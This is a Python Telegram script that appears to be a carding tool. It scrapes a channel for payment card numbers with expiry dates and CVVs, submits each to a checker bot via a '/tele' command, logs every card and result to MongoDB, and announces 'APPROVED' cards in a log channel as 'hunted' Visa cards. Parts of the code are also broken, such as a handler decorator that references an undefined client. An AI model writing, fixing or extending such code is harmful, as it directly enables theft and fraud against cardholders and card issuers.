import os
import time
import random
import re
from pyrogram import Client, filters
from pymongo import MongoClient
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
from config import API_ID, API_HASH, PHONE_NUMBER, CHANNEL, LOG_CHANNEL, BOT_USERNAME, MONGO_URI, DATABASE_NAME, COLLECTION_NAME, PIC_URL

Z = '\033[1;31m'
X = '\033[1;33m'
F = '\033[2;32m'

async def fetch_cards_from_channel():
    # Initialize MongoDB client
    mongo_client = MongoClient(MONGO_URI)
    db = mongo_client[DATABASE_NAME]
    collection = db[COLLECTION_NAME]

    app = Client("session", API_ID, API_HASH)
    await app.start()

    entity = await app.resolve_peer(CHANNEL)
    channel = entity.input_channel

    messages = await app.get_chat_history(channel, limit=2000)

    card_regex = r"\d{16}\ \d{2}\/\d{2}\ \d{3}"
    card_regex2 = r"\d{16}\|\d{2}\|\d{4}\|\d{3}"

    for message in reversed(messages):
        if message.text:
            matches = re.findall(card_regex, message.text) or re.findall(card_regex2, message.text)
            for match in matches:
                await process_card(app, collection, match)

    await app.stop()
    mongo_client.close()

async def process_card(app, collection, cc):
    try:
        await app.send_message(CHANNEL, f"/tele {cc}")
        time.sleep(random.randint(26, 27))
        messages = await app.get_chat_history(CHANNEL, limit=1)
        ccn = messages[0].text
        print(ccn)
        if "APPROVED" in ccn:
            print(F + f'Approved✅{ccn}.')
            mgs = f'''𝙽𝙴𝚆 𝚅𝙸𝚂𝙰 💸𝙷𝚞𝙽𝚃𝙴𝙳❤️💥.
{ccn}.

━━━━━━━━━━━━━━━
𝗖𝗛𝗘𝗞𝗘𝗗 𝗕𝗬"@T4_Mohamed ✨🤍 '''

            # Create an InlineKeyboardMarkup with the button
            button_text = "Access Bot"
            button_url = f"https://t.me/{BOT_USERNAME}"
            keyboard = InlineKeyboardMarkup([[InlineKeyboardButton(button_text, url=button_url)]])

            # Send the welcome message with the picture and button to the log channel
            await app.send_photo(LOG_CHANNEL, PIC_URL, caption=mgs, reply_markup=keyboard)

            # Send the welcome message to the user
            await app.send_message(CHANNEL, f"Welcome to the Bot!\nClick the button below to access the bot.", reply_markup=keyboard)

            time.sleep(1)
        else:
            print(Z + 'Declined❌')

        # Save user data and bot settings to MongoDB
        data = {
            "cc": cc,
            "ccn": ccn
        }
        collection.insert_one(data)

    except Exception as e:
        print(False)
        os.system('clear')
        print("New message:", ccn)
        print(str(e))

async def send_to_log_channel(app, message):
    # Forward the message to the log channel
    await app.forward_messages(LOG_CHANNEL, message.chat.id, message.message_id)

# Help command handler
@app.on_message(filters.command("help"))
async def help_command(_, message):
    help_text = """
    Welcome to the Bot!
    
    Available commands:
    /help - Show this help message
    /start - Start the bot
    /info - Show bot information
    
    Enjoy using the bot!
    """
    await message.reply_text(help_text)

# Run the fetch_cards_from_channel function
with Client("session", API_ID, API_HASH) as app:
    app.run(fetch_cards_from_channel())
